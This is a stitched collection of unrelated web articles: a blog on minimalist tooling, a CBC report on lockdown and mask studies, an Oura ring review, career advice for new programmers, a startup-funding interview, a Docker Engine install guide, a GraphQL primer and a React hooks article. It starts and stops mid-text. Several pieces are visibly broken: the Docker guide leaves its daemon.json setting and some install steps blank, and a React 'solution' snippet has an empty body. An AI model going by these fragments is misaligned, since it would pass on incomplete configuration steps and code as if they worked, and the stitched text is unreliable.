machine.</p><p>As a result, I'm finding myself more and more conservative and pragmatic. ‘Vanilla’ and ‘default are my favorite words. I don't get into zsh or fish, even though I understand the benefits over Bash. Bash is okay. My small config with a bunch of aliases had served me well. I love Doom Emacs, but I come back to my minimalist personal configuration with continuously shrinking number of customizations. I use Make and Bash-scripts for building.</p><p>Mythical “reproducible configuration” does not exist. I mean, it does, with scripts, Ansible, Docker or nixOS, sure, but then you have to constantly maintain the thing that creates maintenance-free environments. Is there a catch here?..</p></article></main></div></div>]]>

And research is suggesting masks might be the way to avoid another lockdown.</p>  <p>Two studies published in the journal <em>Nature</em>&nbsp;calculate up the number of lives that were saved by aggressive lockdown measures.</p>  <p>The <a href="https://www.nature.com/articles/s41586-020-2404-8" target="_blank">first study</a>, from the University of California Berkeley, looked at six countries around the world, including China, the U.S., South Korea, Iran, France and Italy, and found that without lockdown measures, a half a billion more people would have been infected, with millions of deaths as a result.</p>  <p>The <a href="https://www.nature.com/articles/s41586-020-2405-7" target="_blank">second study</a> that looked at 11 European countries found that lockdown measures saved more than three million lives.&nbsp;</p>  <p>Epidemiologist&nbsp;<a href="http://www.dlsph.utoronto.ca/faculty-profile/fisman-david-n/" target="_blank">Dr. David Fisman</a>&nbsp;from the University of Toronto's Dalla Lana School of Public Health said these findings mirror what he and his colleagues discovered&nbsp;when they looked at how effective the timing of lockdown measures were in Ontario. <a href="https://www.acpjournals.org/doi/10.7326/M20-2945" target="_blank">They found</a>&nbsp;that if the lockdown had occurred one month later, there would have been around 15,000 deaths, which doesn't even include long-term care homes, "as opposed to the 600 or so that we've had from the community."&nbsp;</p>  <p><span><figure><div><p><img alt=""

avoid another lockdown</h2>  <p>"If we're opening up our economy, that implicitly says we're going to be having more contacts with each other. So a way to counterbalance that is by decreasing the probability of transmission per contact," said Fisman.</p>  <p>Fisman said masks can reduce the risk of a person getting infected by someone else, but more importantly with COVID-19, they also make it less likely that an infected person will pass on the virus.&nbsp;</p>  <p>Fisman told <a href="https://www.cbc.ca/radio/quirks"><em>Quirks &amp; Quarks</em></a> host Bob McDonald about <a href="https://www.iza.org/publications/dp/13319/face-masks-considerably-reduce-covid-19-cases-in-germany-a-synthetic-control-method-approach" target="_blank">a study</a> from &nbsp;Germany that looked at effectiveness of mandatory mask use, which they rolled out at different times in different regions.</p>  <p>He said mask use "almost acts like a shock in these models. They introduce the masks and bang — a week later, transmission is down."</p>  <p>This is why Fisman co-authored <a href="https://docs.google.com/document/u/1/d/1uUGoH0MsUwmlnOwQbbhyyRh8y4wQhG3SkFs3M-8CjEk/mobilebasic" target="_blank">an open letter</a> to federal and Ontario provincial public health officials calling on them to mandate mask wearing in certain situations, so we can open up the economy while still protecting ourselves.&nbsp;</p>  <p>If, as we open up the economy, the virus starts spreading out of control again like it did prior to the lockdown, then Fisman said masks likely wouldn't be enough to halt the spread and to prevent us from tipping over into exponential growth. For that, he said, we needed a lockdown.&nbsp;</p>  <p><em>Produced and written by <a href="https://twitter.com/SonyaBuyting" target="_blank">Sonya Buyting</a></em></p></span></p></div></div>]]>

<p>I have been using the <a href="https://ouraring.com/">Oura sleep tracking ring</a> for almost two years now. I immediately fell in love with the form factor, as I can’t stand watches or bracelets.</p>



<div><figure><a href="https://ouraring.com/"><img src="https://i1.wp.com/remo.org/wp-content/uploads/2020/06/oura-ring.png?resize=256%2C156&amp;ssl=1" alt="" width="256" height="156" srcset="https://i1.wp.com/remo.org/wp-content/uploads/2020/06/oura-ring.png?w=1024&amp;ssl=1 1024w, https://i1.wp.com/remo.org/wp-content/uploads/2020/06/oura-ring.png?resize=300%2C183&amp;ssl=1 300w, https://i1.wp.com/remo.org/wp-content/uploads/2020/06/oura-ring.png?resize=768%2C469&amp;ssl=1 768w, https://i1.wp.com/remo.org/wp-content/uploads/2020/06/oura-ring.png?resize=850%2C519&amp;ssl=1 850w" sizes="(max-width: 256px) 100vw, 256px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/remo.org/wp-content/uploads/2020/06/oura-ring.png?w=1024&amp;ssl=1 1024w, https://i1.wp.com/remo.org/wp-content/uploads/2020/06/oura-ring.png?resize=300%2C183&amp;ssl=1 300w, https://i1.wp.com/remo.org/wp-content/uploads/2020/06/oura-ring.png?resize=768%2C469&amp;ssl=1 768w, https://i1.wp.com/remo.org/wp-content/uploads/2020/06/oura-ring.png?resize=850%2C519&amp;ssl=1 850w" data-lazy-src="https://i1.wp.com/remo.org/wp-content/uploads/2020/06/oura-ring.png?resize=256%2C156&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a></figure></div>



<h2>When do I wear it?</h2>



<p>I used to wear it all the time, but then switched to night-only. I’m not interested in tracking my steps or any of the other activity features. </p>



<p>It also provides an interesting airport security case study: </p>



<p>Turns out that airport security doesn’t care about the Oura ring. Every time I try to put it off, they say “no no, keep the ring on”, and it never beeped or anything, even though it’s an electronic device.</p>



<h2>Main use cases?</h2>



<p>I mainly use it to observe my body temperature at night. It’s a great early warning system for infections.</p>



<p>Also for my “readiness”. It indicates how restful my night was, informing the intensity of my workouts. I‘ve especially found that “low readiness” combined with an “intense workout” is a really bad combination. Instead I use the earliest signs to „listen to my body“</p>



<p>Another important factor is seeing if I got enough REM sleep.</p>



<h2>What have I learned so far?</h2>



<p>I’ve learned that <a href="https://remo.org/2020/05/28/bedtime/" data-type="1791">time in bed doesn’t equal time asleep</a>. Just because you’ve been in bed for 7 hours doesn’t mean you slept for 7 hours. It’s more likely that you slept 6. Based on my ring, my own difference is 30 to 60 minutes per night.</p>



<p>I’ve also learned more about my sleep cycle. For the first few hours, my body focuses on deep sleep. Towards the morning, the focus is shifted to REM sleep. To feel fully rested, I both need enough deep as well as REM sleep. Especially the REM sleep seems to be the most important factor for me.</p>



<h2>Sick vs. Healthy</h2>



<p>Here is a comparison between me being sick and healthy. Your sleep quality is always summarized into a “readiness” score, which makes it easily comparable.</p>

<h2>How accurate is it?</h2>



<p>At the time I bought the ring, author of <a href="https://www.amazon.de/Why-We-Sleep-Science-Dreams/dp/0141983760/ref=sr_1_1?ie=UTF8&amp;qid=1534409176&amp;sr=8-1&amp;keywords=why+we+sleep&amp;tag=remouherek-21">Why We Sleep</a>, Matthew Walker, has said that this ring was probably the most accurate sleep tracking device for retail consumers. As I loved Matthew’s book, I trust his judgement.</p>



<h2>Hardware</h2>



<p>The battery lasts for 5-7 days, which is fine. The ring does introduce a new charging device to your life—but I guess we got used to charging device inflation, right?</p>



<p>I also like that the ring is waterproof, so you can wash your hands with it, or take a shower. </p>



<p>After 9 months, I had to have my ring replaced on warranty, because the battery life dropped to 1-2 days, and the whole process was very smooth. I never had any problems with my second ring.</p>



<h2>Software</h2>



<p>I love the mobile app. The ring connects via bluetooth and the syncing takes about 20 seconds. The ring receives regular firmware updates, which are also performed through the app.</p>



<h2>Conclusion</h2>



<p>If you care about your sleep and health, I highly recommend using the <a href="https://ouraring.com/">Oura ring</a>.</p>



<p>As a last comment, I strongly believe that the company should be acquired by Apple, as I believe that it would fit nicely into the Apple wearables ecosystem and provide a wonderful new form factor.</p>

<p><em>You can find the first article in the series <a href="https://www.brainstobytes.com/advice-for-new-developers-or-things-i-wish-i-had-known-when-i-started-to-program/">here</a>.</em></p>
<p><em>And the previous article <a href="https://www.brainstobytes.com/advice-for-new-developers-or-things-i-wish-i-had-known-when-i-started-programming-part-3/">here</a></em></p>
<h2 id="lovemaintenanceworkoratleastlearntoappreciateit">Love maintenance work or at least learn to appreciate it</h2>
<p>Very few things are more despised by programmers than doing maintenance work and working with legacy apps.</p>
<p>This can be counterproductive, as most of the work available involves doing exactly that. Companies have running systems, some built a long time ago, and someone needs to maintain that code. This is especially true if you are starting at an entry position, where you'll most likely work on some old application the company has been running for more than a decade.</p>
<p>We love working on new projects for several reasons:</p>
<ul>
<li>We can choose which technology to use.</li>
<li>We can flex our creatives muscles and create something cool.</li>
<li>There's a lot of freedom when designing the solution.</li>
<li>You get to work on The Next Big Thing and all the credit it carries.</li>
</ul>
<p>The huge difference between how we perceive maintenance work and new project development is a sad thing. On one hand, most of the really important job with high impact happens on those legacy systems, whereas The Next Big Thing often goes bust. On the other hand, that cool new app will be legacy as soon as it hits production and you start receiving new requirements.</p>
<p>We should start seeing maintenance work under a more positive light. After all, most of the value provided to end users happens on those systems. We could exercise our creative muscles by refactoring and improving the design, or increasing the test coverage, all proper challenges for developers of any level.</p>
<p>Learn to love maintenance work, it's most likely what you'll spend doing most of the time as a programmer.</p>
<h2 id="makeaccomplishmentsvisible">Make accomplishments visible</h2>
<p>You are an awesome developer, always finishing tasks on time, writing ultra-complete test suites and providing to customers exactly what they want. You do a great job every day and work extra hard to ship those last-minute features. Then, that time of the year when promotions are given arrives and you... you are still in the same position?</p>
<p>I know it can be extremely frustrating, and you might end up resenting management. After all, aren't you always doing an outstanding job? how dare they pass this chance to show me how much they appreciate my hard work!</p>
<p>In reality, managers are just too busy to keep track of your accomplishments. It's your responsibility to make your contribution visible to management.</p>
<p>It doesn't even require too much effort. Keep a list of the most important things you accomplish every week, and send small reports at the end of the week listing what you accomplished. You don't need to generate a fancy document: an email with bullet points will do.</p>
<p>It has two important advantages:</p>
<ul>
<li>Management doesn't need to pester you to get an idea of what you are doing at work.</li>
<li>You keep a registry of your accomplishments, which is useful for negotiating raises and other things.</li>
</ul>
<p>Take a proactive stance on the way management evaluates you, one of the biggest mistakes you can make is to outsource that responsibility to people who are already too busy with other things. Management will appreciate it, and so will you.</p>
<h2 id="fighttheimpostersyndrome">Fight the imposter syndrome</h2>
<p>Congratulations!</p>
<p>You got your first software development job. The idea of being interviewed made you feel very anxious, but you studied hard and aced the whole thing. Finally, you arrive at the office on your first day and...</p>
<p>And it's terrifying. Suddenly, you feel like a Jon Snow who knows nothing, and self-doubt starts to creep in. What if they find out I am not that smart? do I really deserve this job? am I a fraud? how long will it take them before they find out I'm a fraud and the horrible mistake they made by hiring me?</p>
<p>The following weeks don't help that much. Perhaps it's a technology you are not that familiar with, or maybe they ask you to work on some dark corner of their massive legacy application. Solving the tasks take you twice (or more) as long as the estimate, and you grow more and more anxious.</p>
<p>Been there, more than once.</p>
<p>It's all normal, the good old imposter syndrome. It's this feeling that you are fake, and that you don't deserve to be there. It will go away after a couple of weeks and you'll start to feel more confident. Ramp-up takes time, and in truth, no one really expects you to be 100% productive from the start. Your employer knows it will take some months before you know what you are doing, so don't punish yourself that hard.</p>
<p>Keep working hard, in no time you will become an important part of the team and your contributions will start to have an impact. We've all felt it, and I guarantee you it will go away. So keep up the good work!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<article>
<p>There are countless articles on the web that talk about what investors look for when funding your&nbsp;startup. Normally they all focus on similar things:</p>
<ul>
<li>A stunning pitch deck</li>
<li>Solid financials</li>
<li>Market opportunity</li>
<li>A founding team with the “X-Factor”</li>
<li>Execution capability</li>
</ul>
<p>All of which are, undeniably, important. But even if you<em> think </em>you have everything figured out, the numbers don’t lie. Few startups successfully raise capital and <a href="https://altar.io/raising-capital-for-a-startup-first-steps-to-a-great-deal/" target="_blank" rel="noopener noreferrer" data-href="https://altar.io/raising-capital-for-a-startup-first-steps-to-a-great-deal/">even fewer get a good deal</a>.</p>
<p>So what’s different for the founders that do secure funding? What secrets do they know that the rest are oblivious to?</p>
<p>To find out, I sat down (virtually) with Startup expert <a href="https://www.linkedin.com/in/paulobrien/" target="_blank" rel="noopener noreferrer" data-href="https://www.linkedin.com/in/paulobrien/">Paul O’Brien</a>, CEO of <a href="https://mediatech.ventures/" target="_blank" rel="noopener noreferrer" data-href="https://mediatech.ventures/">MediaTech Ventures</a>, to take a closer look at the hidden details behind startup funding and the information you absolutely need to know that often lurks beneath the surface.</p>
<figure><img src="https://cdn-images-1.medium.com/max/720/0*o6iG3lyonjpbkc8D" alt="Expert Interview: The Hidden Details When Funding Your Startup - Paul O'Brien, CEO MediaTech Ventures #1" width="720" height="479" data-image-id="0*o6iG3lyonjpbkc8D" data-width="1440" data-height="958"></figure>
<h3>About Paul&nbsp;O’Brien</h3>
<h4>Q: Can you tell us a bit about yourself and what you&nbsp;do</h4>
<p><strong>A: </strong>I grew up in the midwest of the United States when the economy was rough there. Then I ended up in Silicon Valley when Yahoo, Google &amp; Facebook emerged so I’ve experienced both sides of an economy. And how an economy, how a workforce and how entrepreneurs can actually suffer if there isn’t an intentional investment in the entire ecosystem, the entire economy.</p>
<p>So I live now in Austin, Texas. And as the United States is shifting — because of cost it’s shifting a lot of attention from the coasts to other parts of the world. Most of that in the US is coming to Texas. So <a href="https://www.cnbc.com/2016/08/11/austin-is-top-place-for-startups-in-america-not-silicon-valley.html" target="_blank" rel="noopener noreferrer" data-href="https://www.cnbc.com/2016/08/11/austin-is-top-place-for-startups-in-america-not-silicon-valley.html">Texas is largely considered a future hub of innovation</a> for the entire US, and frankly the entire world.</p>
<p>And so here, now, I serve that economic development to help venture capital make more meaningful investments in innovation. I do that very distinctly in the media industry. We focus on everything from podcasting technology to the next Hulu, to the next Spotify, to what’s going on in the video gaming business.</p>
<h4>Q: How long have you been advising startups on investment and economic&nbsp;growth?</h4>
<p><strong>A: </strong>I’ve been doing this work in a broad sense for, [smiles] how old am I, maybe about 20 years back in Silicon Valley. I started my career at Yahoo and so essentially when I was done with Yahoo I worked with Hewlett Packard for a couple of years. And then I started working with startups so it’s been quite a while that I’ve been working with startups seeking Venture Capital funding in particular.</p>
<p><strong>Related</strong>: <a href="https://altar.io/startup-series-funding-everything-you-need-to-know/" target="_blank" rel="noopener noreferrer">Startup Series Funding: Everything You Need To Know</a></p>
<h4>Q: Do you focus on Pre-Revenue or Post-Revenue Startups?</h4>
<p><strong>A: </strong>They are very<em> very</em> different areas of focus. I think the mistake that most founders and service providers make is they treat startups as though pre-revenue and post-revenue work, mentorship, and priorities are all the same. They’re not.</p>
<p>What we do at MediaTech Ventures is we work through incubators, and we run an incubator of our own, to work with that pre-revenue sort of “Seed stage”. What I mean by that is we work to develop methodologies for programs, companies, and even cities and countries, that enable us all to better support those early founders at scale.</p>
<p>Frankly, most founders and most startups at that earlier stage all tend to need the same advice and direction, maybe with some nuance [smiles]. But frankly, that <strong>early-stage tends to have all of the same issues</strong>.</p>
<p>I more personally work at the later stage, essentially the Series A &amp; Series B stage which is why we use the word venture capital so distinctly. I tend to work with Venture Capital funds and firms and<em> their </em>interests in particular. And, of course, VCs don’t participate at the seed stage and hence they’re very different stages to be working. I tend not to work beyond that. I don’t work Series C, I don’t work very much with larger companies or in M &amp; A (Mergers &amp; Acquisitions).</p>
<h3><em><span>“I think the mistake that most founders and service providers make is they treat startups as though pre-revenue and post-revenue work, mentorship and priorities are all the same. They’re&nbsp;not.”</span></em></h3>
<h4>Q: So your main focus is VC, but do you also make introductions to Angel Investors &amp; Private&nbsp;Equity?</h4>
<p><strong>A: </strong>Yes, our main focus is Venture Capital funding, and not because we can’t work with others. Certainly, private equity participates at every stage, mostly later stage but really every stage.</p>
<p>The distinct difference, of course, is that a Venture Capital firm and a fund has a fiduciary responsibility to invest. That’s why <em>the thing </em>exists, they’re obligated to invest. And the partners there have no choice. The limited partners don’t give money to a Venture Capital fund just to sit on it. So it’s a very distinct stage and tends to focus at the middle.</p>
<p>Private Equity is very different because, of course, private equity can do whatever it wants! [laughs] It can completely ignore startups if they’d like to. So, I tend not to work there just because private equity has too many differences, too many nuances.</p>
<p>I work with private equity <strong>as it pertains to our sector, to our industry in particular</strong>. So we work with a lot of media industry private equity. But unless they’re focused on the media industry, we don’t bother. Because they can be all over the place. Whereas Venture Capitalists tend to have all the same expectations at a certain stage.</p>
<p>To answer the question more explicitly we tend not to make introductions to Angels because of our thesis on how best to do that and how that should work. We do make introductions to Venture Capitalists. We don’t broker deals, I don’t believe in getting paid a percentage of equity to connect VCs. We certainly do make introductions, I believe that startups that are worth being funded ethically deserve to be known to investors who want to invest in startups. So we try not to monetise that happening and we make introductions as best we can at the venture capital stage.</p>
<p>What we do at the angel stage, or seed stage is actually the opposite. We have a database of a lot of seed-stage media startups and instead,<strong> we enable the Angel community to actually see that a little bit more transparently</strong>. So basically instead of introducing Angels, because of our thesis about how and why to connect with Angels, we instead more <strong>aggressively promote and expose what seed-stage startups are doing</strong> so that angels are aware of it and consider them if they want to.</p>

<h3>The Hidden Details When Funding Your Startup</h3>
<h4>Q: An early-stage startup has a lot to do and one of the things you need is capital. Do you think it’s meaningful to have investors on board who are experts in startups and/or a specific sector and can provide connections (Smart Money)? Or do you just need someone who can give you a cash injection?</h4>
<p><strong>A: </strong>It’s a great question. That’s a question that I talk about nearly every day with people. Here’s Why:</p>
<p>First, you have to distinguish a <strong>startup </strong>from a <strong>new business</strong>. A new business is not a startup. A new business knows its business model. A new business can make money <em>right now</em>. A new business, a restaurant or an agency, for example, is not a startup. They can go and sell to customers immediately. And in that context, your clarification makes some sense. Should you go talk to a bank? Yeah! Of course! [laughs] Should you find a business partner who’s an investor? Absolutely! Because we can go capitalise this business and make money with it right now.</p>
<p>Startups are<em> not at all</em> the same thing. And it’s very important that the industry, and the world, <strong>appreciate the distinction</strong>. It tends not to because the word “startup” is very popular. Everybody wants to call themselves a startup because it’s sexy. But we can’t! It’s not the same thing. A startup does not know its business model — <strong>a startup by definition does not know how to make money</strong>. And there’s nothing wrong with that — that’s the definition of a startup: “I have an idea, I have a technology, I have a patent, I have something with which I cannot make money right now because I don’t know how to yet. We haven’t figured out how to yet.”</p>
<h3><em><span>“A new business is not a startup. And it’s very important that the industry, and the world, appreciate the distinction. It tends not to because the word “startup” is very popular. Everybody wants to call themselves a startup because it’s sexy. But we can’t! It’s not the same&nbsp;thing.”</span></em></h3>
<p>My favourite example of that is something that recently happened: <strong>ridesharing</strong>.</p>
<p>Lyft was <em>not</em> a startup (at least not the way most should think of it as one). We called it a startup but it wasn’t. Because the startup in ridesharing occurred years before that.</p>
<p>Lyft was the <strong>second mover — “A</strong> <strong>new business in ridesharing”</strong>. So Lyft was <em>definitely </em>not a startup because they looked at what Uber did and just did the same thing. And, of course, throughout the world, we have a bunch of people trying to create ridesharing apps and local businesses for ridesharing. None of those are startups because we already know <strong>how the business of ridesharing works</strong>.</p>
<p>So, a startup <strong>being net new</strong>, always… <em>always</em> the biggest mistake founders make is they try to raise capital to start. Here’s the bottom line:<strong> no startup in the history of the world can raise money just to get going. </strong>Unless you’re Elon Musk, unless you’re Mark Zuckerberg, no one is going to give anybody money just to start something.</p>
<p>So startup finance<em> has</em> to start with:</p>
<ol>
<li>Their own savings</li>
<li>Their own debt</li>
<li>Friends and family</li>
</ol>
<p>Period. The research is there, the reason the average age of success for a startup founder is <a href="https://altar.io/managers-improve-become-successful-entrepreneurs/" target="_blank" rel="noopener noreferrer" data-href="https://altar.io/managers-improve-become-successful-entrepreneurs/">45 years old, <strong>and not 20</strong>,</a> is that they have savings and have money to spend. Period.</p>
<h3><em><span>“No startup in the history of the world can raise money just to get going. Unless you’re Elon Musk, unless you’re Mark Zuckerberg, no one is going to give anybody money just to start something.”</span></em></h3>
<h4>Q: That’s really interesting, there’s a couple of examples that are a bit different that might change the …</h4></article></div></div>

  <p>Install and upgrade of Docker Engine is simple and straightforward process.</p>
<p>In this post I will cover all important information in one place.</p>

<p>Minimum requirements</p>
<ul>
<li>8GB RAM per manager node</li>
<li>4GB RAM per worker node</li>
<li>3GB of free disk space</li>
</ul>
<p>Recommended production requirements</p>
<ul>
<li>16GB RAM per manager node</li>
<li>4 vCPUs per manager node</li>
<li>25-100GB of free disk space on each node</li>
</ul>
<p>Also you must have one of the following OS:</p>
<ul>
<li>CentOS 7.1+ 64 bit version</li>
<li>Ubuntu 16.04/18.04/19.10 64 bit versions</li>
</ul>
<p>Preferable storage driver on newer OS is <code>overlay2</code>.<br>
Docker engine will set it by default.</p>
<p>If you want to get to know what is storage driver, what storage drivers are advised on certain OS and how to change it or looking for detailed info about setup of devicemapper, look at:</p>
<p><a href="https://knowledgepill.it/posts/docker_storage_drivers/">Docker storage driver - guide </a><br>
<a href="https://knowledgepill.it/posts/docker_configure_devicemapper/">Docker devicemapper - setup</a></p>
<hr>
<h5 id="important">Important</h5>
<p>If you plan to use Docker Enterprise with multiple nodes or Swarm - remember to set up time synchro between nodes - use NTP for that.</p>
<hr>

<ul>
<li>Ensure that <code>centos-extras</code> repo is enabled</li>
<li>Install <code>yum-utils</code>:</li>
</ul>
<ul>
<li>Add repo</li>
</ul>
<div><pre><code data-lang="bash">yum-config-manager <span>\
</span><span></span>  --add-repo <span>\
</span><span></span>  https://download.docker.com/linux/centos/docker-ce.repo
</code></pre></div><ul>
<li>Install docker engine(Valid GPG Key: <code>060A 61C5 1B55 8A7F 742B 77AA C52F EB6B 621E 9F35</code>)</li>
</ul>
<div><pre><code data-lang="bash">yum install docker-ce docker-ce-cli containerd.io
</code></pre></div><p>CentOS 8 at day of writing this post has problem with dependiences for containerd.io - you can solve this by installing manually correct version of containerd.io before running <code>docker-ce</code> instalation command. Example</p>
<div><pre><code data-lang="bash">yum install https://download.docker.com/linux/centos/7/x86_64/stable/Packages/containerd.io-1.2.6-3.3.el7.x86_64.rpm
</code></pre></div><ul>
<li>Start and enable autostart of daemon:</li>
</ul>
<div><pre><code data-lang="bash">systemctl start docker
systemctl enable docker
</code></pre></div><p>Optionally you can list available versions of docker and install preferable one:</p>
<div><pre><code data-lang="bash">yum list docker-ce --showduplicates | sort -r
</code></pre></div><div><pre><code data-lang="bash"> yum install docker-ce-&lt;VERSION_STRING&gt; docker-ce-cli-&lt;VERSION_STRING&gt; containerd.io
</code></pre></div><hr>
<p>For installing Docker Enterprise Edition you have to set up repo on your OS after getting from <a href="https://hub.docker.com/my-content">Docker Hub Account</a> Docker EE Repo Adress.</p>
<hr>

<ul>
<li>Update system and install important packages</li>

<p>If you want that running containers won’t stop with docker daemon you can enable live restore feature. After enabling it you can perform upgrade of docker engine without stopping running containers.</p>
<p>In <code>/etc/docker/daemon.json</code> set:</p>
<p>Upgrade on CentOS or Ubuntu - if we install docker engine from repo - can be performed with simple <code>yum upgrade</code> or <code>apt-get upgrade</code> commands.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><strong>GraphQL is a new approach</strong> for building an API that aims to get the better of two basic <strong>RESTful APIs limitations</strong> which are data filters &amp; relationships. These two classic REST flaws force REST users to always get the full payload in response &amp; hit multiple data sources separately.</p>
<h2>What is GraphQL</h2>
<p><strong>GraphQL is a data query and manipulation language</strong> for APIs created and open-source by Facebook to solve the problem of unoptimized data flow in their mobile app. In general, GraphQL is a syntax that describing the way of requesting data from the server. The main difference comparing Graph QL to traditional REST API is that the response format is described in the query and defined by the client rather than the server. Another important thing about GraphQL is that it is language agnostic.</p>
<h2>Basic structure</h2>
<p>The core notion of using GraphQL is a <em>schema</em>.  Designing a schema is one of the first steps in the development process, casting a shadow over the rest of the project. A carefully planned Graph QL schema is the core of a well-designed and secure product. GraphQL Schema is a center-piece of any Graph QL project and it strictly defines its structure &amp; regulates how the data can be accessed.</p>
<h5>GraphQL Queries &amp; Mutations</h5>
<p>There are two basic types of GrahQL operations which are GraphQL Queries &amp; GraphQL Mutations:</p>
<ul>
<li><em>GraphQL Queries</em> - query allows you to read or fetch data from the server-side,</li>
<li><em>GraphQL Mutations</em> - mutations are used to write or post values.</li>
</ul>

    </span></p>
<p>The performed operations have a form of a string that a GraphQL server can parse and respond to with requested data in a specific format i.e JSON.</p>
<h5>GraphQL Resolvers</h5>
<p>In order to understand what we are querying for the GraphQL server needs to have a defined set of functions/rules that our server would use to generate the response. These functions are called GraphQL Resolvers and they are responsible for handling our queries.</p>

<h2>GraphQL vs REST</h2>
<p>Imagine we want to retrieve posts from a company blog using RESTful API. First, we need to <code>GET api/posts</code>, but posts have other data like authors so we need to call REST API again to get the details of the posts i.e. authors ending up with two server requests instead of one, and as you continue to scale, you may have even more requests to different endpoints in order to fetch all the needed data. </p>
<p>The performance drop, especially on slow cellular connections,  was the main problem Facebook engineers observed, and the urge to find its solution was a substructure for GraphQL. In GraphQL API we have a single endpoint being able to process complex requests. You query the GraphQL server for specific data and it will respond with what was requested, which results in fewer bits transferred over the wire.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>React as a framework</h2>
<p>React has been out in the world of web development for quite some time now and its position as a tool for agile web development has steadily strengthened in recent years. Especially after the announcement and release of the <a href="https://reactjs.org/docs/hooks-state.html#hooks-and-function-components">new hook api/concept</a>, writing components has never been easier.</p>
<p>Although the team behind react and the huge community have tried to train and explain the concepts of the framework in an impressive way, I still see some pitfalls and common mistakes that were made while working with it.
I kept a list of all the mistakes I saw over the last years related to react especially with using hooks. In this article I want to show you the most common ones and I will also try to explain in detail, why I think they are mistakes and a suggestion for doing it in a cleaner way.</p>
<h3>Disclaimer</h3>
<p>Before we start with the list, I have to say that most of the following things are not fundamental mistakes or don't look wrong at first glance, and also most of them are unlikely to affect the performance or apperance of the application.
Probably nobody would notice, except for the developers working on the product, that something is wrong here, but I still believe that good quality code can lead to a better developer experience and thus to a better product.</p>
<p>As with any software framework or library, there are millions of different opinions about it. Everything you see here is based on my personal opinion and should not be considered a general rule.
If you have a different opinion about her, I would love to hear it 🌟</p>
<h2>1. Using useState when no rerender is needed</h2>
<p>One of the core concepts of react is dealing with state. You can control your entire data flow and rendering through the state. Each time the tree is rendered again, it is most likely tied to a change in the state.</p>
<p>With the <code>useState</code> hook you can now also define your state in function components, which is a really neat and easy way how to handle states in react. But it can also be misused as we see in the following example.</p>
<p>For the next example we need a bit of explanation, suppose we have two buttons, one button is a counter and the other button sends a request or triggers an action with the current count. However, the current number is never displayed within the component. It is only required for the request when you click the second button.</p>

<h3>The problem ⚡</h3>
<p>At the first sight, you might ask what is exactly the problem with that? Isn't what what the state was made for?
Sure you are right, this will work just fine and probably there will be never a problem with that, however in react every state change will force a rerender for that component and most likely its children, but in the above example since we never use that state in our render part, this will end up being an unnecessary render every time we set the counter, which can impact the performance or could have unexpected side effects.</p>
<h3>The solution ✅</h3>
<p>If you want to use a variable inside your component which should keep its value between rendering but also don't force a rerender, you can use the <code>useRef</code> hook. It will keep the value, but doesn't force the component to rerender.</p>
<div data-language="jsx"><pre><code><span>function</span> <span>ClickButton</span><span>(</span><span>props</span><span>)</span> <span>{</span>

  <span>)</span><span>;</span>
<span>}</span></code></pre></div>
</div><div>
<h2>2. Using router.push instead of a link</h2>
<p>This might be a very easy and obvious one and not really related to react itself, but I still see it quite a lot when people writing react components.</p>
<p>Let's say you will write a button and with clicking the button the user should be redirected to another page. Since its a <a href="https://en.wikipedia.org/wiki/Single-page_application">SPA</a>, this action will be a client-side routing mechanism. So you will need some kind of library for doing that.
In react the most popular one is <a href="https://reacttraining.com/react-router/">react-router</a> and the following example will use that library.</p>
<p>So adding a click listener will redirect the user to the desired page right?</p>
<h3>This is dangerous ❌</h3>
<div data-language="jsx"><pre><code><span>function</span> <span>ClickButton</span><span>(</span><span>props</span><span>)</span> <span>{</span>
  <span>const</span> history <span>=</span> <span>useHistory</span><span>(</span><span>)</span><span>;</span>

  <span>const</span> <span>onClick</span> <span>=</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
    history<span>.</span><span>push</span><span>(</span><span>'/next-page'</span><span>)</span><span>;</span>
  <span>}</span><span>;</span>

  <span>return</span> <span><span><span>&lt;</span>button</span> <span>onClick</span><span><span>=</span><span>{</span>onClick<span>}</span></span><span>&gt;</span></span><span>Go to next page</span><span><span><span>&lt;/</span>button</span><span>&gt;</span></span><span>;</span>
<span>}</span></code></pre></div>
<h3>The problem ⚡</h3>
<p>Even though this would work just fine for most of the users, there is huge problem when it comes to accessibility here. The button will not be marked as linking to another page at all, which makes it nearly impossible to be identified by screen readers.
Also could you open that in a new tab or window? Most likely not.</p>
<h3>The solution ✅</h3>
<p>Linking to other pages with any user interaction should as far as possible be handled by the <code>&lt;Link&gt;</code> component or a normal <code>&lt;a&gt;</code> tag.</p>
<div data-language="jsx"><pre><code><span>function</span> <span>ClickButton</span><span>(</span><span>props</span><span>)</span> <span>{</span>
  <span>return</span> <span>(</span>
    <span><span><span>&lt;</span><span>Link</span></span> <span>to</span><span><span>=</span><span>"</span>/next-page<span>"</span></span><span>&gt;</span></span><span>
      </span><span><span><span>&lt;</span>span</span><span>&gt;</span></span><span>Go to next page</span><span><span><span>&lt;/</span>span</span><span>&gt;</span></span><span>
    </span><span><span><span>&lt;/</span><span>Link</span></span><span>&gt;</span></span>
  <span>)</span><span>;</span>
<span>}</span></code></pre></div>
<p><strong>Bonus points:</strong> it also makes the code a lot more readable and shorter!</p>
<h2>3. Handling actions via useEffect</h2>
<p>One of the best and most thoughtful hooks introduced by React is the "useEffect" hook. It enables the processing of actions related to <code>prop</code> or <code>state</code> changes.
Despite its helpful functionality, it is also often used in places where it may not be needed.</p>
<p>Imagine a component that fetches a list of items and render them to the dom. In addition, if the request is successful, we would like to call the "onSuccess" function, which is passed on to the component as a prop</p>
<h3>This is dangerous ❌</h3>
<div data-language="jsx"><pre><code><span>function</span> <span>DataList</span><span>(</span><span><span>{</span> onSuccess <span>}</span></span><span>)</span> <span>{</span>
  <span>const</span> <span>[</span>loading<span>,</span> setLoading<span>]</span> <span>=</span> <span>useState</span><span>(</span><span>false</span><span>)</span><span>;</span>
  <span>const</span> <span>[</span>error<span>,</span> setError<span>]</span> <span>=</span> <span>useState</span><span>(</span><span>null</span><span>)</span><span>;</span>
  <span>const</span> <span>[</span>data<span>,</span> setData<span>]</span> <span>=</span> <span>useState</span><span>(</span><span>null</span><span>)</span><span>;</span>

